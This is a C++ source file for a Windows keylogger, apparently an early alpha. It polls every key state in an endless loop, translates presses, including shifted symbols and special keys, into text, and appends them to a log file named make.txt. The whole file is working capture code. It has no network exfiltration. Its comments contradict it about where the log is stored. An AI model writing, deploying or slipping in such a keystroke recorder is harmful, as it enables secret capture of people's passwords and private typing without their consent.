#include <windows.h>
#include <string>
#include <fstream>
using namespace std;

const char *const Version = "alpha 0.1.0.1";

string GetKey(int Key){
	string KeyString = "";
	//判断符号输入
	const int KeyPressMask = 0x80000000;
	int iShift = GetKeyState(0x10);
	bool IS = (iShift & KeyPressMask) == KeyPressMask;
	if(Key >=186 && Key <=222){
		if(IS){
			switch(Key){
				case 186:
					KeyString = ":";
					break;
				case 187:
					KeyString = "+";
					break;
				case 188:
					KeyString = "<";
					break;
				case 189:
					KeyString = "_";
					break;
				case 190:
					KeyString = ">";
					break;
				case 191:
					KeyString = "?";
					break;
				case 192:
					KeyString = "~";
					break;
				case 219:
					KeyString = "{";
					break;
				case 220:
					KeyString = "|";
					break;
				case 221:
					KeyString = "}";
					break;
				case 222:
					KeyString = "\"";
					break;
			}
		}else switch(Key){
				case 186:
					KeyString = ";";
					break;
				case 187:
					KeyString = "=";
					break;
				case 188:
					KeyString = ",";
					break;
				case 189:
					KeyString = "-";
					break;
				case 190:
					KeyString = ".";
					break;
				case 191:
					KeyString = "/";
					break;
				case 192:
					KeyString = "`";
					break;
				case 219:
					KeyString = "[";
					break;
				case 220:
					KeyString = "\\";
					break;
				case 221:
					KeyString = "]";
					break;
				case 222:
					KeyString = "'";
					break;
		}
	}
	if (Key == VK_ESCAPE)
		KeyString = "[Esc]";
	else if (Key == VK_F1)
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT)
		KeyString = "[PrtScr]";
	else if (Key == VK_SCROLL)
		KeyString = "[ScrLk]";
	else if (Key == VK_PAUSE)
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL)
		KeyString = "[CapsLk]";
	else if (Key == VK_BACK) //<- 回格键
		KeyString = "[Bksp]";
	else if (Key == VK_RETURN) // 回车键、换行
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // 空格
		KeyString = " ";
	else if (Key == VK_LSHIFT) // 左侧上档键
		KeyString = "[LShift]";
	else if (Key == VK_RSHIFT) // 右侧上档键
		KeyString = "[RShift]";
	else if (Key == VK_TAB) // 制表键
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL) // 左控制键
		KeyString = "[LCtrl]";
	else if (Key == VK_RCONTROL) // 右控制键
		KeyString = "[RCtrl]";
	else if (Key == VK_LMENU) // 左换档键
		KeyString = "[LAlt]";
	else if (Key == VK_RMENU) // 右换档键
		KeyString = "[RAlt]";
	else if (Key == VK_LWIN) // 右 WINDOWS 键
		KeyString = "[LWin]";
	else if (Key == VK_RWIN) // 右 WINDOWS 键
		KeyString = "[RWin]";
	else if (Key == VK_APPS) // 键盘上 右键
		KeyString = "[Menu]";
	else if (Key == VK_INSERT) // 插入
		KeyString = "[Ins]";
	else if (Key == VK_DELETE) // 删除
		KeyString = "[Del]";
	else if (Key == VK_HOME) // 起始
		KeyString = "[Home]";
	else if (Key == VK_END) // 结束
		KeyString = "[End]";
	else if (Key == VK_PRIOR) // 上一页
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT) // 下一页
		KeyString = "[PgDn]";
	else if (Key == VK_LBUTTON)
		KeyString = "[LMB]";
	else if (Key == VK_RBUTTON)
		KeyString = "[RMB]";
	else if (Key == VK_VOLUME_MUTE)
		KeyString = "[Mute]";
	else if (Key == VK_VOLUME_DOWN)
		KeyString = "[Vol-]";
	else if (Key == VK_VOLUME_UP)
		KeyString = "[Vol+]";
	else if (Key == VK_MEDIA_NEXT_TRACK)
		KeyString = "[MediaNext]";
	else if (Key == VK_MEDIA_PREV_TRACK)
		KeyString = "[MediaPrev]";
	else if (Key == VK_MEDIA_STOP)
		KeyString = "[MediaStop]";
	else if (Key == VK_MEDIA_PLAY_PAUSE)
		KeyString = "[MediaPlay]";
	// 不常用的几个键:一般键盘没有
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";
	else if (Key == VK_LEFT) //上、下、左、右键
		KeyString = "[Left]";
	else if (Key == VK_RIGHT)
		KeyString = "[Right]";
	else if (Key == VK_UP)
		KeyString = "[Up]";
	else if (Key == VK_DOWN)
		KeyString = "[Down]";
	else if (Key == VK_NUMLOCK)//小键盘数码锁定
		KeyString = "[NumLk]";
	else if (Key == VK_ADD) // 加、减、乘、除
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == VK_DECIMAL) // 小键盘 . 及键盘 .
		KeyString = ".";
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	else if (Key >=97 && Key <= 122){ // 字母:a-z
		if (GetKeyState(VK_CAPITAL)){
			if(IS)
				KeyString = Key;
			else
				KeyString = Key - 32;
		}else{
			if(IS)
				KeyString = Key - 32;
			else
				KeyString = Key;
		}
	}
	else if (Key >=48 && Key <= 57){// 键盘数字:0-9及上方的符号
		if(IS){
			switch(Key){
				case 48: //0
					KeyString = ")";
					break;
				case 49://1
					KeyString = "!";
					break;
				case 50://2
					KeyString = "@";
					break;
				case 51://3
					KeyString = "#";
					break;
				case 52://4
					KeyString = "$";
					break;
				case 53://5
					KeyString = "%";
					break;
				case 54://6
					KeyString = "^";
					break;
				case 55://7
					KeyString = "&";
					break;
				case 56://8
					KeyString = "*";
					break;
				case 57://9
					KeyString = "(";
					break;
			}
		}else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON){
		if (Key >=65 && Key <=90){ //ASCII 65-90 为A-Z
			if (GetKeyState(VK_CAPITAL)){ // 大写锁定:输出A-Z
				if(IS) // 大写锁定，并且按下上档键:输出为小写字母
					KeyString = Key + 32;
				else // 只有大写锁定:输出为大写字母
					KeyString = Key;
			}else{ // 大写没有锁定:a-z
				if(IS){
					KeyString = Key;
				}else{
					KeyString = Key + 32;
				}
			}
		}
	}
	return KeyString;
}

int main(){
	string Filename = "make.txt";//倒出记录文本存在D盘log.txt目录下
	string TempString;
	fstream File;
	File.open(Filename.c_str(), std::fstream::out | std::fstream::app);
	while(true){
		Sleep(5);
		for(int i = 8; i <= 255; i ++){
			if(GetAsyncKeyState(i) & 1){
				TempString = GetKey(i);
				File.write(TempString.c_str(), TempString.size());
				File.close();
				File.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			}
		}
	}
	return 0;
}

